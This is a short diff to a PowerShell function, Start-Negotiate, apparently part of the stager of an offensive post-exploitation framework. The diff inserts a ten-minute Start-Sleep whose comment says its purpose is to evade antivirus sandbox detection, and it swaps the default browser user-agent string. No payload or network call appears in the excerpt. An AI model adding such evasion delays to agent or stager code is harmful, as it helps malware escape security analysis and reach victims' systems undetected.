@@ -1,4 +1,8 @@
 function Start-Negotiate{
+    # add a delay (default 10 minutes) in the code execution to avoid AV sandbox detection
+    # TODO:  make this parameter configurable via the menu
+    Start-Sleep -s 600
+    
     # param($s,$SK,$UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
     param($s,$SK,$UA="lol")
     
